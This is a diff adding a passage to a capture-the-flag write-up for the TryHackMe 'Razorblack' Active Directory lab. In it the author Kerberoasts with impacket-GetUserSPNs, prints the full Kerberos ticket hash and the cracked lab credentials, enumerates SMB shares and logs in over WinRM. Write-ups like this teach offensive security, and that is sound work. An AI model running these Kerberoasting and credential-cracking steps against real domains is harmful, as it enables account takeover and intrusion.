@@ -163,5 +163,45 @@ we got user `twilliams` hash. let's crack it
 
 cracked the hash. `twilliams:roastpotatoes`. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f8d5a3b1-8b9c-4128-9633-51ce525bd31c)
+
+enumerating shares, we got some shares readable by the user `twilliams`. checked the shares nothing useful
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
+└─$ impacket-GetUserSPNs -dc-ip 10.10.35.124  -outputfile hashes.asreproast1 -request raz0rblack.thm/twilliams
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
+-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
+HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 16:17:17.715160  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+                                                                                                                                                                                  
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
+└─$ cat hashes.asreproast1 
+$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$7ae4457d8bf96d2c0748118da861fb6f$5d18faaced9393e01b82c46741898aab905e0cd294afc46c6610035a620b7ee397f0f71fa14b0462c88c15ee9be832bd6291d4e3a778c88a6a55a669c14a19130ad241e8ee068992fc03de9a0440f07e5a428c5bf6f9a63f5fe84e9db8679e5fb127dc3d90acda058c2e4e1c0f22328bb2d4d055dede1b809f3403c7caf850afebd23ed3af568ccc531060363b24360a5e1ca7638f1121c9c9cf4e760364aed4581fa63f4e64e2e458343fa6e74e7e0757e1366d042f0276e96ebdc8e606f615aa5504408e53dbd4dcbbe3c250ef4f735130442364211902a9c5ac2e36ebc4e1173c30cf343c35a66370453ae71e0987426c33630c01e07b20679be4f4b37f763211fc4ccd027311f3da82e0ca21b060395701e669dc016c40a4743c005a980505523a1915d98de703a4a004d600f0f81ab87a466707e9883de5865c3b00d4e515d8c8c25058542d68541bfb7161d3ef65f45dbd0c1813c8eda752d44172df55def38393a84099641524901264cbe5e40d76e8fc3c77cc59c589a899c6c85f5215e9d3f88837bbf6dad2dd60a56db289bdea8dcac3ed900327ec9e1590edd2f8b444518da403dc1babc2704f9f35be7fdaeaa4f8ff1051827033cadbbd7c1d1f48d0561b8ce94946c50011b2b8db419ad7160751deed85680f710d84e85c645fc84687e667b92ee42ad7ddf04be1c3e1c6f062af80525b0224f0aa1bc6dddcebeff3fd8307384eaa22cacd2787db1eb042520ecaa943191d0c73d27c20645bfce23dce538c42e8e9c13e807b761ce6754901f60fa6490ca262b2223a373284a8177c3dc5046b30999dae25401432ec1dd5713a304ca66a75e9b667696513df9061739443d0c402dd8738819e121cb60d104250a44942b3077fd6ba6907701d44971ef98c07a60efa5f2065c4e93a2ec2161ea35ee584a23170bc6e251c6b9d83bd91796c2ba22e3a855010d25f537e9486cb161e1172f835346b8d44e82799e332f9a6178446ade77e484077356b2d3444574ed2495146bd77b258e916e3fd8c52459e839799a82db133f88aaebb8af5cffdf6f5bb3d5fb6b42f65dd47944af2e5b077e392818280dda61a4d3f1ba762bd8f6a8ab8f7392fc5aa58e6036619375b49617de219bf04576942487574964bf02b5aac1fcf9aeb5456b4ecbf35257b2806964b801a9923a9b2162ac404d07e4e1eaa4340753b1c4a477107d122978bf23d2b3f175c0f53191d20b4b2deb64d6d61c237772a42bafe91d065ce203a42c127ea9ae3c672f45700fcfc63bf419348d7dfb40091a6094ab4cb13ccaa881db8af9d7e1ff01e6cf650c5c028af82c43e74dc417a37c1dddadb5bd4394bd4d3eb487fe16bcd67d816284819661ab5d13b42b6cd951136acd8a494a61d29463766b86b097ee1ece13fa58c1b46a225b4
+```
+using the cred to perform keberoasting, we got another user hash. let's crack it. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8d79d3cc-6846-4fb1-bf84-7dfb3e8e6ec3)
+
+cracked the hash. `*xyan1d3:cyanide9amine5628`
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6298ff3e-3d3e-4637-ba2b-5be803bd8d41)
+
+Enumerating smb shares, we can see we have some juicy permissions. let's check it out. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3d6d9dc0-ded8-4fbd-8f2c-584e96a47fc0)
+
+tried winrm and we can login winrm using the cred. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/69ef837f-2849-459f-aabb-837476ae8473)
+
+logged in using winrm. 
+
 
 
